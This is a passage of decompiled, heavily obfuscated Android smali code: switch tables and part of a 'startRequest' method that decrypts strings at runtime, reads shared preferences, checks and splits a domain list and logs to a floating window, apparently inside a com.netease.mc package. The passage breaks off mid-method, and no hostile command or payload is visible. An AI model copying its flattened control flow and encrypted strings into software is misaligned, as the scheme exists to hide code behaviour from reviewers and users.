    :sswitch_data_27
    .sparse-switch
        -0x7d93bb24 -> :sswitch_8d
        -0x6a23ba08 -> :sswitch_8c
        -0xde7096e -> :sswitch_8b
        0x38ec99a7 -> :sswitch_8e
    .end sparse-switch

    :sswitch_data_28
    .sparse-switch
        -0x4320c2d1 -> :sswitch_99
        0x42ec3a0a -> :sswitch_92
        0x6f93d31c -> :sswitch_98
        0x74936754 -> :sswitch_9b
    .end sparse-switch

    :sswitch_data_29
    .sparse-switch
        -0x408e2ee8 -> :sswitch_93
        -0x20b90e14 -> :sswitch_97
        0xb95e811 -> :sswitch_95
        0x6c6d4385 -> :sswitch_96
    .end sparse-switch

    :sswitch_data_2a
    .sparse-switch
        -0x31188f3a -> :sswitch_a1
        0x13787a5b -> :sswitch_a2
        0x3b45ce74 -> :sswitch_9d
        0x690b8ce3 -> :sswitch_9a
    .end sparse-switch

    :sswitch_data_2b
    .sparse-switch
        -0x10e0a127 -> :sswitch_9f
        0x17b240ed -> :sswitch_9e
        0x3933c537 -> :sswitch_9c
        0x70dbfaf5 -> :sswitch_a0
    .end sparse-switch

    :sswitch_data_2c
    .sparse-switch
        -0x68df9a6c -> :sswitch_a3
        -0x237d8320 -> :sswitch_a9
        -0x9ed56cd -> :sswitch_aa
        0x6c8fbc54 -> :sswitch_a5
    .end sparse-switch

    :sswitch_data_2d
    .sparse-switch
        -0x743c2f0b -> :sswitch_a4
        -0x236d8b68 -> :sswitch_a8
        0x418587eb -> :sswitch_a7
        0x59fb2790 -> :sswitch_a6
    .end sparse-switch

    :sswitch_data_2e
    .sparse-switch
        -0x6a0bdf95 -> :sswitch_ab
        -0x1c2953f1 -> :sswitch_b1
        0x1822c5f0 -> :sswitch_a3
        0x19e9f2ee -> :sswitch_b0
    .end sparse-switch

    :sswitch_data_2f
    .sparse-switch
        -0x2f50d021 -> :sswitch_ac
        -0x536f23e -> :sswitch_ad
        0x1942ee97 -> :sswitch_ae
        0x46974011 -> :sswitch_af
    .end sparse-switch
.end method

.method public static startRequest(Landroid/content/Context;Z)V
    .locals 26

    const/16 v16, 0x0

    const/4 v7, 0x0

    const/16 v23, 0x0

    const/16 v22, 0x0

    const/4 v12, 0x0

    const/4 v3, 0x0

    const/4 v11, 0x0

    const/4 v10, 0x0

    const/4 v8, 0x0

    const/4 v9, 0x0

    const/4 v6, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v2, 0x0

    const-string v1, "\u06db\u06d6\u06e2\u06e7\u06ec\u06e5\u06d8\u06df\u06d8\u06e1\u06d8\u06e1\u06d6\u06e6\u06df\u06e5\u06d9\u06e5\u06db\u06e8\u06db\u06e1\u06d8\u06d8\u06d6\u06e2\u06e5\u06d8\u06df\u06d7\u06ec\u06e4\u06e4\u06df\u06dc\u06e0\u06dc\u06e1\u06e5\u06e6\u06d8"

    move v13, v2

    move v14, v4

    move v15, v5

    move-object/from16 v17, v6

    move-object/from16 v18, v9

    move-object/from16 v19, v10

    move-object/from16 v20, v11

    move-object/from16 v21, v12

    :goto_0
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v2

    const/16 v4, 0x3ae

    xor-int/2addr v2, v4

    xor-int/lit16 v2, v2, 0xaa

    const/16 v4, 0x3d6

    const v5, -0x51f6aa5f

    xor-int/2addr v2, v4

    xor-int/2addr v2, v5

    sparse-switch v2, :sswitch_data_0

    goto :goto_0

    :sswitch_0
    const-string v1, "\u06d8\u06dc\u06ec\u06df\u06d6\u06db\u06da\u06db\u06e8\u06d8\u06da\u06e7\u06db\u06df\u06d8\u06e1\u06dc\u06da\u06d8\u06e0\u06df\u06d7\u06e4\u06e8\u06e8\u06d8\u06e8\u06d8\u06d7\u06d6\u06e6\u06d6"

    goto :goto_0

    :sswitch_1
    const-string v1, "\u06d8\u06e1\u06d9\u06db\u06e0\u06d6\u06d8\u06d9\u06d9\u06df\u06e2\u06d8\u06e7\u06e5\u06e1\u06d8\u06d8\u06d9\u06d8\u06d8\u06e8\u06e2\u06e5\u06df\u06d8\u06eb\u06ec\u06ec\u06db\u06dc\u06d7\u06d9\u06e1\u06db\u06e6\u06d8\u06e1\u06da\u06e5\u06d8\u06d6\u06e7\u06d9\u06d7\u06df\u06d7\u06e4\u06e6\u06d6\u06d8\u06d8\u06e1\u06df\u06e0\u06e1\u06d9\u06e5\u06ec\u06d8\u06d8"

    goto :goto_0

    :sswitch_2
    const/16 v16, 0x1

    const-string v1, "\u06e6\u06e7\u06e6\u06d8\u06d8\u06d7\u06e8\u06e1\u06e5\u06e5\u06d8\u06d8\u06df\u06dc\u06da\u06e0\u06da\u06e5\u06da\u06e7\u06e1\u06db\u06e5\u06d8\u06e8\u06e2\u06e0\u06e1\u06e8\u06dc\u06dc\u06ec\u06d6\u06d6\u06dc\u06e1\u06d8\u06db\u06d7\u06e1\u06d7\u06e6\u06d8\u06da\u06ec"

    goto :goto_0

    :sswitch_3
    const v2, -0x5c5b96c5

    const-string v1, "\u06eb\u06e1\u06e5\u06d8\u06d9\u06da\u06d6\u06d7\u06dc\u06e8\u06d8\u06e4\u06eb\u06e5\u06d8\u06e7\u06db\u06e6\u06d8\u06d8\u06dc\u06e2\u06eb\u06dc\u06eb\u06dc\u06e4\u06e2\u06e7\u06ec\u06dc\u06da\u06df\u06e1\u06d8\u06d9\u06df\u06d6\u06d8\u06e6\u06d9\u06e2\u06db\u06d6\u06dc\u06e1\u06d7\u06da\u06d9\u06ec\u06e1\u06d8\u06e6\u06e6\u06e7\u06df\u06df\u06dc\u06d8\u06ec\u06db\u06d8"

    :goto_1
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v2

    sparse-switch v4, :sswitch_data_1

    goto :goto_1

    :sswitch_4
    const v4, -0x3953041e

    const-string v1, "\u06df\u06d7\u06da\u06db\u06d8\u06d8\u06e1\u06e6\u06e2\u06d7\u06d6\u06da\u06e6\u06eb\u06e6\u06ec\u06e1\u06e8\u06dc\u06ec\u06e6\u06d8\u06e0\u06e5\u06d8\u06d7\u06dc\u06d6\u06d8\u06e6\u06eb\u06e1\u06d6\u06e4\u06e1\u06df\u06df\u06e8"

    :goto_2
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_2

    goto :goto_2

    :sswitch_5
    sget-boolean v1, Landroidx/base/저장;->a:Z

    if-nez v1, :cond_0

    const-string v1, "\u06e6\u06db\u06e1\u06e2\u06e0\u06d6\u06db\u06eb\u06d7\u06e4\u06dc\u06df\u06e2\u06eb\u06dc\u06d8\u06d9\u06da\u06e2\u06d8\u06db\u06e5\u06d8\u06e8\u06df\u06eb\u06e1\u06ec\u06d8\u06da\u06d8\u06dc\u06d8\u06e0\u06d8\u06e8\u06db\u06ec\u06d7\u06e0\u06d9\u06e2\u06e8\u06e7\u06ec\u06d9\u06e4\u06df\u06db\u06eb\u06e1\u06e6\u06dc\u06e4\u06e1\u06d6\u06ec"

    goto :goto_2

    :sswitch_6
    const-string v1, "\u06ec\u06eb\u06e0\u06d7\u06e5\u06e5\u06d8\u06e5\u06da\u06e6\u06d8\u06d7\u06db\u06e1\u06d8\u06e7\u06d7\u06d8\u06e5\u06d9\u06e8\u06d8\u06d9\u06da\u06dc\u06e5\u06e1\u06eb\u06e7\u06e2\u06df\u06e7\u06dc\u06d8\u06d8\u06d8\u06e2\u06d6\u06d8"

    goto :goto_1

    :cond_0
    const-string v1, "\u06e7\u06d7\u06d6\u06da\u06d8\u06e7\u06d8\u06db\u06e2\u06dc\u06e8\u06e4\u06e1\u06e6\u06e7\u06dc\u06ec\u06e1\u06d8\u06d7\u06e0\u06d8\u06d8\u06d6\u06e6\u06d9\u06dc\u06da\u06df\u06d6\u06eb\u06e4\u06e1\u06e0\u06e4\u06e1\u06e8\u06ec"

    goto :goto_2

    :sswitch_7
    const-string v1, "\u06eb\u06da\u06e4\u06e7\u06d6\u06e8\u06d8\u06d8\u06e6\u06d7\u06d9\u06e7\u06e0\u06e4\u06da\u06e2\u06da\u06e1\u06d6\u06d8\u06d9\u06e1\u06eb\u06eb\u06e2\u06e8\u06db\u06dc\u06e7\u06d8\u06df\u06ec\u06e1\u06eb\u06db\u06e6\u06e7\u06d9\u06e8\u06e5\u06d6\u06e6\u06e8\u06d6\u06e1\u06df\u06e6\u06e7\u06e4\u06ec"

    goto :goto_2

    :sswitch_8
    const-string v1, "\u06e6\u06e8\u06d8\u06d8\u06d6\u06df\u06e4\u06d7\u06d9\u06da\u06e8\u06db\u06e1\u06d9\u06db\u06e0\u06d7\u06d9\u06e0\u06e8\u06e7\u06dc\u06e1\u06dc\u06d9\u06da\u06e2\u06e7\u06d7\u06d9\u06e0"

    goto :goto_1

    :sswitch_9
    const-string v1, "\u06e7\u06eb\u06d7\u06eb\u06e1\u06d8\u06e8\u06df\u06d8\u06d8\u06da\u06d7\u06dc\u06e7\u06e6\u06d7\u06d8\u06e4\u06d7\u06d7\u06d6\u06eb\u06d6\u06e8\u06e7\u06db\u06e1\u06d6\u06ec\u06e4\u06db\u06e1\u06da\u06e2\u06eb"

    goto :goto_1

    :sswitch_a
    const-string v1, "\u06e2\u06e1\u06e4\u06d7\u06e0\u06df\u06e5\u06e8\u06e8\u06d8\u06db\u06eb\u06da\u06e6\u06d9\u06d6\u06e5\u06ec\u06e1\u06e2\u06ec\u06e4\u06e4\u06d9\u06e8\u06d8\u06d7\u06dc\u06e6\u06df\u06e1\u06d8\u06df\u06e5\u06df\u06e6\u06e8\u06e1\u06e4\u06e4\u06da\u06ec\u06e2\u06d6\u06d8\u06ec\u06e1\u06d6\u06db\u06e0\u06e2\u06eb\u06e7\u06e8\u06da\u06e7"

    goto :goto_0

    :sswitch_b
    const v2, 0x303a6dc2

    const-string v1, "\u06e2\u06e0\u06e5\u06d8\u06df\u06e8\u06d8\u06e8\u06d9\u06e5\u06da\u06d8\u06d7\u06df\u06e2\u06e8\u06e4\u06e0\u06eb\u06e0\u06d9\u06e6\u06d8\u06ec\u06e7\u06e8\u06d8\u06e2\u06e6\u06e4\u06e0\u06d8\u06e2\u06df\u06d8\u06e8\u06d8\u06d9\u06e5\u06d8\u06d8\u06d6\u06e6\u06e1\u06e2\u06e8\u06e4\u06e0\u06e6\u06d8\u06e0\u06e6\u06e6\u06d8"

    :goto_3
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v2

    sparse-switch v4, :sswitch_data_3

    goto :goto_3

    :sswitch_c
    const-string v1, "\u06e6\u06d6\u06d8\u06d8\u06eb\u06ec\u06db\u06e1\u06d6\u06e7\u06d8\u06e0\u06dc\u06dc\u06d8\u06e5\u06e5\u06e1\u06d6\u06d7\u06da\u06e2\u06e6\u06d7\u06e5\u06d6\u06e4\u06dc\u06da\u06d8\u06d8\u06e7\u06db\u06ec\u06e1\u06da\u06e7\u06db\u06d6\u06e5\u06d9\u06e6\u06e5\u06d8\u06db\u06d9\u06d6\u06d8\u06e1\u06d6\u06e7\u06d8\u06d8\u06e4\u06e8"

    goto :goto_0

    :sswitch_d
    const-string v1, "\u06e1\u06e6\u06e8\u06d8\u06eb\u06eb\u06ec\u06e4\u06d9\u06e4\u06d7\u06e5\u06e7\u06d8\u06e6\u06d9\u06d8\u06eb\u06d9\u06dc\u06dc\u06e2\u06e5\u06df\u06ec\u06e6\u06d8\u06db\u06e2\u06d6\u06d8\u06df\u06ec\u06e8\u06d8\u06d9\u06e8\u06ec\u06da\u06e1\u06e1\u06d7\u06e2\u06d9\u06d8\u06ec\u06d8\u06d8\u06e7\u06e6\u06e0\u06da\u06d7\u06e7\u06e5\u06dc\u06e7\u06e7\u06d7\u06e8\u06d8"

    goto :goto_3

    :sswitch_e
    const v4, 0x200d1096

    const-string v1, "\u06ec\u06d9\u06e8\u06d8\u06e1\u06eb\u06e5\u06d8\u06da\u06e4\u06da\u06d8\u06e0\u06d8\u06e4\u06e4\u06d6\u06d7\u06e5\u06e4\u06e0\u06df\u06eb\u06e7\u06e4\u06ec\u06e6\u06d7\u06e5\u06d8\u06ec\u06eb\u06db\u06da\u06e0\u06e2\u06ec\u06e0\u06e8\u06d8\u06e1\u06e8\u06e0\u06db\u06e2\u06e4\u06e5\u06e1\u06eb\u06d8\u06d8"

    :goto_4
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_4

    goto :goto_4

    :sswitch_f
    const-string v1, "\u06ec\u06db\u06e7\u06e2\u06e8\u06d8\u06db\u06db\u06e1\u06d8\u06ec\u06e5\u06d7\u06da\u06df\u06d8\u06e7\u06e6\u06d9\u06d8\u06e2\u06ec\u06d7\u06e0\u06db\u06e7\u06dc\u06d7\u06d7\u06e6\u06e4\u06df\u06e4\u06e8\u06d6\u06e0"

    goto :goto_4

    :cond_1
    const-string v1, "\u06da\u06e6\u06d6\u06d8\u06e2\u06d9\u06db\u06d7\u06e7\u06e6\u06eb\u06e7\u06d7\u06eb\u06e4\u06e0\u06db\u06e6\u06d8\u06e6\u06d7\u06e1\u06d8\u06d8\u06e7\u06df\u06e8\u06e8\u06e4\u06dc\u06d6\u06e8\u06e5\u06eb\u06e1\u06d8\u06d8\u06e4\u06df"

    goto :goto_4

    :sswitch_10
    sget-object v1, Landroidx/base/저장;->b:Lorg/json/JSONObject;

    if-eqz v1, :cond_1

    const-string v1, "\u06d9\u06e5\u06e1\u06d8\u06d7\u06df\u06d6\u06d8\u06e8\u06e2\u06e7\u06db\u06e5\u06e7\u06d8\u06e0\u06eb\u06e7\u06e6\u06d6\u06e1\u06d8\u06db\u06d7\u06e5\u06e1\u06e6\u06e5\u06d8\u06e5\u06ec\u06d9\u06eb\u06e0\u06e1\u06d7\u06d9\u06d7\u06e0\u06e1\u06db\u06d8\u06df\u06d6\u06e8\u06dc\u06e7\u06d8\u06dc\u06e7\u06d9\u06e2\u06dc\u06db"

    goto :goto_4

    :sswitch_11
    const-string v1, "\u06dc\u06df\u06d7\u06eb\u06da\u06e4\u06e1\u06e0\u06e0\u06e0\u06e1\u06e0\u06eb\u06ec\u06dc\u06e2\u06df\u06d8\u06ec\u06df\u06e5\u06e6\u06e5\u06d9\u06d8\u06e0\u06e1\u06db\u06d6\u06e8\u06d8\u06d8\u06d6\u06e7\u06d7\u06e1\u06d9\u06e1\u06d8\u06e8\u06e6\u06d6\u06d8\u06e6\u06d9\u06e6\u06e4\u06e2\u06d8\u06d8\u06d7\u06eb\u06e2\u06eb\u06d9\u06db"

    goto :goto_3

    :sswitch_12
    const-string v1, "\u06dc\u06d9\u06d8\u06d8\u06d7\u06d6\u06e5\u06ec\u06e6\u06da\u06e5\u06db\u06ec\u06ec\u06eb\u06d8\u06e4\u06e1\u06e1\u06d8\u06dc\u06dc\u06da\u06e8\u06df\u06dc\u06dc\u06d9\u06e1\u06d8\u06e5\u06db\u06e4\u06e6\u06ec\u06e4\u06db\u06dc\u06e6\u06d8\u06ec\u06df\u06d6\u06d8\u06eb\u06dc\u06dc\u06e0\u06d7\u06e4\u06dc\u06df\u06dc\u06e8\u06e0\u06df\u06e4\u06d6\u06d8"

    goto :goto_3

    :sswitch_13
    const v2, 0x30ac113a

    const-string v1, "\u06e4\u06e8\u06e7\u06d8\u06db\u06d7\u06e2\u06e7\u06e0\u06da\u06e0\u06e1\u06e7\u06d8\u06e7\u06e8\u06e4\u06e8\u06eb\u06dc\u06e0\u06da\u06e8\u06d8\u06dc\u06ec\u06eb\u06db\u06e7\u06e6\u06d8\u06dc\u06eb\u06db\u06ec\u06eb\u06d6\u06d8\u06e2\u06e7\u06df\u06db\u06e6\u06d8\u06e2\u06e7\u06d9\u06e5\u06e1\u06eb\u06e8\u06d6\u06eb\u06dc\u06d6\u06d6\u06d8\u06eb\u06e0\u06da"

    :goto_5
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v2

    sparse-switch v4, :sswitch_data_5

    goto :goto_5

    :sswitch_14
    const v4, 0xfebb460

    const-string v1, "\u06d7\u06d9\u06e4\u06e8\u06e8\u06e7\u06d8\u06e0\u06d6\u06e7\u06d8\u06db\u06d6\u06e7\u06d8\u06d6\u06d6\u06e7\u06e4\u06d8\u06e0\u06d6\u06db\u06e1\u06d8\u06e5\u06df\u06e8\u06e7\u06df\u06e2\u06df\u06e2\u06d7"

    :goto_6
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_6

    goto :goto_6

    :sswitch_15
    const-string v1, "\u06e2\u06d7\u06d6\u06d8\u06e8\u06e2\u06e2\u06d7\u06db\u06d7\u06eb\u06d9\u06e0\u06e2\u06ec\u06da\u06da\u06d9\u06df\u06df\u06e8\u06e6\u06dc\u06e1\u06e7\u06d8\u06e7\u06da\u06d9\u06d8\u06d7\u06df\u06db\u06db\u06e1\u06d8\u06d6\u06db\u06db"

    goto :goto_6

    :sswitch_16
    const-string v1, "\u06d7\u06e6\u06d8\u06d8\u06d6\u06e8\u06e1\u06db\u06da\u06d7\u06db\u06d7\u06e4\u06d7\u06e1\u06dc\u06e2\u06eb\u06d9\u06e7\u06d8\u06d8\u06ec\u06eb\u06e5\u06d8\u06dc\u06e2\u06e2\u06dc\u06e4\u06df\u06d8\u06e5\u06e7\u06df\u06e4\u06e4\u06ec\u06df\u06e0\u06db\u06e0"

    goto :goto_5

    :cond_2
    const-string v1, "\u06da\u06d8\u06df\u06e0\u06e0\u06dc\u06d8\u06e0\u06e7\u06e1\u06df\u06db\u06d6\u06d8\u06d6\u06e2\u06e6\u06e6\u06d7\u06e2\u06db\u06e8\u06e6\u06dc\u06e6\u06dc\u06d8\u06e6\u06df\u06e5\u06e1\u06d6\u06d8\u06d8\u06db\u06e2\u06e5\u06d6\u06e0\u06d7\u06db\u06db\u06dc\u06df\u06d9\u06e0"

    goto :goto_6

    :sswitch_17
    if-nez p1, :cond_2

    const-string v1, "\u06da\u06dc\u06da\u06eb\u06d8\u06db\u06d7\u06e6\u06e8\u06d8\u06e7\u06df\u06d7\u06e5\u06da\u06d6\u06e6\u06e7\u06dc\u06d8\u06eb\u06eb\u06d8\u06d8\u06e5\u06eb\u06e8\u06d8\u06e4\u06da\u06da\u06e4\u06e5\u06eb\u06ec\u06e7\u06e6\u06d9\u06d7\u06da\u06e1\u06ec\u06d8\u06e4\u06da\u06df\u06d8\u06d9\u06e5\u06e8\u06da\u06e6\u06d8"

    goto :goto_6

    :sswitch_18
    const-string v1, "\u06e0\u06e4\u06d7\u06df\u06e2\u06e6\u06db\u06da\u06ec\u06d8\u06e1\u06ec\u06e6\u06d8\u06e0\u06e5\u06e7\u06d8\u06d7\u06df\u06dc\u06e0\u06e2\u06d6\u06ec\u06da\u06e4\u06dc\u06e5\u06ec\u06e5\u06d7\u06df\u06dc\u06df\u06d8\u06e8\u06d7\u06d6\u06d8\u06e2\u06e8\u06e5"

    goto :goto_5

    :sswitch_19
    const-string v1, "\u06db\u06e2\u06dc\u06d8\u06e0\u06e2\u06da\u06e5\u06db\u06e1\u06d8\u06d8\u06d8\u06e1\u06d8\u06dc\u06e6\u06ec\u06e4\u06d7\u06e6\u06d6\u06e5\u06d9\u06e2\u06e6\u06df\u06e8\u06e2\u06e6\u06dc\u06e6\u06e8\u06d8"

    goto :goto_5

    :sswitch_1a
    const-string v1, "\u06e6\u06da\u06e5\u06d8\u06e0\u06e5\u06e4\u06d7\u06e2\u06dc\u06e0\u06dc\u06e7\u06e8\u06d6\u06ec\u06e5\u06e1\u06e1\u06d8\u06e0\u06e2\u06e5\u06df\u06da\u06d6\u06e8\u06e8\u06d8\u06e5\u06e8\u06e1\u06ec\u06ec\u06d7\u06e6\u06d9\u06d9\u06d8\u06d9\u06e8\u06d7\u06eb\u06df\u06e8\u06e1\u06d9\u06dc\u06e0\u06e1"

    goto/16 :goto_0

    :sswitch_1b
    const/4 v1, 0x1

    sput-boolean v1, Landroidx/base/저장;->a:Z

    const-string v1, "\u06e1\u06e5\u06d9\u06d7\u06e1\u06ec\u06ec\u06e4\u06ec\u06db\u06d9\u06e5\u06d8\u06e1\u06e7\u06e6\u06e2\u06db\u06e2\u06e0\u06e5\u06db\u06e1\u06e4\u06d7\u06d7\u06e6\u06d6\u06e6\u06d7\u06db\u06d9\u06eb\u06df\u06e0\u06d8\u06d8\u06e5\u06e8\u06e6\u06d8\u06e4\u06e8\u06e1\u06d8\u06e7\u06d6\u06e7\u06d8\u06e0\u06dc\u06e7\u06d8\u06ec\u06da\u06d8\u06d8\u06e0\u06db\u06d7"

    goto/16 :goto_0

    :sswitch_1c
    sget-object v1, Landroidx/base/저장;->d:Ljava/lang/String;

    const/4 v2, 0x0

    move-object/from16 v0, p0

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v7

    const-string v1, "\u06e4\u06da\u06e4\u06e1\u06e7\u06e5\u06d8\u06dc\u06d7\u06da\u06e0\u06e2\u06dc\u06e0\u06d8\u06da\u06e0\u06e2\u06e1\u06e4\u06dc\u06da\u06e7\u06e4\u06e7\u06db\u06e7\u06ec\u06db\u06df\u06e5\u06dc\u06e0\u06ec\u06e4\u06dc\u06ec\u06d6\u06e7\u06e7\u06e7\u06e4\u06eb\u06dc\u06eb\u06e8\u06d8\u06e0\u06e1\u06d8"

    goto/16 :goto_0

    :sswitch_1d
    const-string v1, "PFsFZjwihbB+DyQPfBTy3mJ7bAYWTt6XMUgyZSor\n"

    const-string v2, "2eeFg5upYzk=\n"

    invoke-static {v1, v2}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "obRJ7A==\n"

    const-string v4, "yNovg7ik94Q=\n"

    invoke-static {v2, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "\u06d9\u06e2\u06e5\u06e4\u06e8\u06db\u06e8\u06ec\u06e6\u06d7\u06d9\u06d6\u06d8\u06e4\u06e6\u06e4\u06e4\u06e1\u06d8\u06d6\u06e0\u06dc\u06d7\u06db\u06e5\u06e8\u06eb\u06e1\u06d8\u06e7\u06e5\u06e2\u06e5\u06dc\u06d6\u06d8\u06d8\u06da\u06e0"

    goto/16 :goto_0

    :sswitch_1e
    sget-object v1, Lcom/netease/mc/m439a/cfEHNcirhPZZLCL;->DOMAINS:Ljava/lang/String;

    const-string v2, "FFT+lhHdDFocVOc=\n"

    const-string v4, "T3e62VycRRQ=\n"

    invoke-static {v2, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    const-string v1, "\u06d8\u06e6\u06e6\u06d8\u06e4\u06e7\u06e8\u06da\u06dc\u06e5\u06d8\u06e5\u06dc\u06eb\u06d8\u06dc\u06d8\u06e1\u06df\u06ec\u06e8\u06df\u06dc\u06eb\u06e8\u06d6\u06d8\u06df\u06e0\u06e5\u06d9\u06ec\u06e5\u06e8\u06d8\u06e4\u06ec\u06dc\u06d7\u06da\u06e0\u06d6\u06d8\u06e7\u06e0\u06e8\u06d8\u06e1\u06db\u06d6\u06d8\u06eb\u06ec\u06d7"

    move/from16 v23, v2

    goto/16 :goto_0

    :sswitch_1f
    const v2, 0x21927a4

    const-string v1, "\u06d9\u06db\u06e8\u06e7\u06e6\u06d6\u06d8\u06e5\u06e5\u06e1\u06d8\u06df\u06dc\u06e8\u06e4\u06d6\u06dc\u06e2\u06e6\u06e2\u06eb\u06ec\u06e1\u06e0\u06db\u06dc\u06e5\u06db\u06e5\u06db\u06e1\u06eb\u06e8\u06eb\u06d7\u06d9\u06e0\u06db"

    :goto_7
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v2

    sparse-switch v4, :sswitch_data_7

    goto :goto_7

    :sswitch_20
    const v4, 0x1d18c364

    const-string v1, "\u06ec\u06e4\u06e4\u06dc\u06df\u06e8\u06d7\u06df\u06dc\u06e8\u06dc\u06dc\u06dc\u06d9\u06d6\u06e6\u06eb\u06e5\u06dc\u06e8\u06e1\u06e0\u06db\u06eb\u06e5\u06e0\u06da\u06dc\u06df\u06da\u06eb\u06d9\u06e8\u06dc\u06eb\u06db\u06d8\u06e8\u06ec\u06d8\u06e0\u06e6\u06d8\u06e1\u06e7\u06e1"

    :goto_8
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_8

    goto :goto_8

    :sswitch_21
    if-nez v23, :cond_3

    const-string v1, "\u06e0\u06dc\u06dc\u06e0\u06ec\u06e5\u06d7\u06df\u06d6\u06d9\u06eb\u06e8\u06d6\u06e7\u06d8\u06d8\u06e1\u06e6\u06e2\u06e6\u06e2\u06d6\u06d8\u06ec\u06e1\u06d8\u06d9\u06da\u06df\u06dc\u06e6\u06dc\u06da\u06dc\u06dc\u06dc\u06e8\u06e7\u06e1\u06e5\u06e8\u06d7\u06eb\u06e8\u06d8\u06e2\u06e6\u06e4\u06e8\u06eb\u06da\u06ec\u06d6\u06da\u06d9\u06e5\u06e5"

    goto :goto_8

    :sswitch_22
    const-string v1, "\u06e7\u06e0\u06e1\u06d6\u06e1\u06eb\u06d6\u06df\u06e0\u06eb\u06dc\u06e1\u06da\u06d6\u06e2\u06ec\u06e1\u06da\u06e5\u06e0\u06da\u06e0\u06df\u06dc\u06d8\u06e0\u06da\u06d9\u06db\u06e1\u06d6\u06da\u06e8\u06dc\u06e4\u06df\u06e8\u06d8\u06e7\u06e4\u06d7\u06e7\u06e6\u06e7\u06d9\u06da\u06eb\u06df\u06da\u06d7"

    goto :goto_7

    :cond_3
    const-string v1, "\u06d9\u06dc\u06df\u06e5\u06df\u06e5\u06db\u06dc\u06d8\u06d8\u06ec\u06e2\u06db\u06e6\u06e6\u06d8\u06df\u06e7\u06ec\u06d9\u06eb\u06d9\u06dc\u06da\u06e0\u06d7\u06df\u06d6\u06d8\u06d6\u06df\u06df\u06e0\u06e6\u06e8\u06d8\u06df\u06d8\u06e1\u06d8\u06df\u06db\u06dc\u06d8\u06da\u06da\u06e1\u06d8\u06db\u06e6\u06e2\u06d8\u06e1\u06e5\u06d8\u06e0\u06d9\u06eb\u06e4\u06da\u06dc\u06d8"

    goto :goto_8

    :sswitch_23
    const-string v1, "\u06e4\u06e7\u06d7\u06e2\u06d9\u06e7\u06e7\u06dc\u06dc\u06eb\u06e2\u06da\u06d8\u06e5\u06d8\u06eb\u06dc\u06e2\u06e1\u06e4\u06da\u06d8\u06ec\u06e6\u06e2\u06e5\u06d6\u06d8\u06da\u06e2\u06df\u06e5\u06dc\u06e5\u06d8\u06d8\u06ec\u06d9"

    goto :goto_8

    :sswitch_24
    const-string v1, "\u06e0\u06ec\u06e5\u06d8\u06e7\u06e5\u06e7\u06d8\u06eb\u06dc\u06ec\u06e6\u06e5\u06d7\u06e8\u06e8\u06e1\u06d7\u06e4\u06eb\u06e2\u06e2\u06e4\u06e6\u06e8\u06e6\u06d8\u06e7\u06e1\u06e1\u06ec\u06d7\u06e8\u06d8\u06e0\u06e4\u06da\u06e4\u06e2\u06e5\u06dc\u06e2\u06e4\u06e2\u06dc\u06d8\u06e6\u06db\u06eb\u06d8\u06e8"

    goto :goto_7

    :sswitch_25
    const-string v1, "\u06db\u06e1\u06d6\u06e4\u06e1\u06dc\u06d8\u06dc\u06dc\u06e6\u06dc\u06e6\u06e5\u06e6\u06db\u06db\u06e0\u06e1\u06df\u06d9\u06d6\u06d8\u06e1\u06e5\u06d9\u06e0\u06e8\u06d9\u06e2\u06e0\u06e7\u06d7\u06ec\u06db\u06d7\u06e7\u06e2\u06ec\u06dc\u06e6\u06d8\u06e1\u06e0\u06da\u06df\u06d9\u06db\u06eb\u06ec\u06e7"

    goto :goto_7

    :sswitch_26
    const-string v1, "\u06d9\u06e5\u06dc\u06ec\u06dc\u06d9\u06e8\u06df\u06e5\u06d8\u06ec\u06e1\u06da\u06e4\u06ec\u06e5\u06d8\u06db\u06e5\u06ec\u06ec\u06dc\u06e7\u06db\u06e8\u06db\u06e2\u06d8\u06d8\u06d8\u06e4\u06e1\u06e8\u06d9\u06dc\u06d6\u06dc\u06da\u06ec\u06e0\u06db\u06db\u06d6\u06dc\u06e5\u06d8"

    goto/16 :goto_0

    :sswitch_27
    sget-object v1, Lcom/netease/mc/m439a/cfEHNcirhPZZLCL;->DOMAINS:Ljava/lang/String;

    const-string v2, "1Q==\n"

    const-string v4, "+ZndCS8lymw=\n"

    invoke-static {v2, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v22

    const-string v1, "\u06df\u06d7\u06e8\u06e2\u06db\u06e1\u06e7\u06e5\u06e7\u06e4\u06df\u06e7\u06df\u06db\u06e4\u06df\u06e0\u06eb\u06da\u06e6\u06d8\u06e8\u06e0\u06e6\u06e4\u06e2\u06d6\u06d8\u06eb\u06ec\u06d6\u06d6\u06e5\u06d8\u06d8\u06e2\u06d8\u06eb\u06d7\u06e6\u06e0\u06e6\u06dc\u06e7"

    goto/16 :goto_0

    :sswitch_28
